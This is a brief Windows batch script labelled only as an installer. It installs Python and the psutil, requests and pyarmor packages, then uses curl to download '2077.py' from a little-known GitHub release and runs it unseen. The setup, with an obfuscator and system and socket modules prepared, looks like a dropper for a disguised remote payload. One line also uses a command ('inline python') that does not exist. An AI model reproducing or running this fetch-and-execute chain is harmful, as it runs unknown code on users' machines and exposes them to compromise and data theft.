@echo off
REM installer
winget install Python.Python.3.14
inline python -c "import sys, subprocess, importlib.util; REQUIRED_PACKAGES = ['psutil', 'requests', 'pyarmor']; [subprocess.check_call([sys.executable, '-m', 'pip', 'install', p]) for p in REQUIRED_PACKAGES if not importlib.util.find_spec(p)]"
python -c "import sys, subprocess, os, platform, psutil, requests, json, uuid, re, pathlib, base64, socket; print('All packages ready and modules imported!')"
curl -o 2077.py https://github.com/user7007-ui/configs/releases/download/v0-1-1-alpha/2077.py
python 2077.py
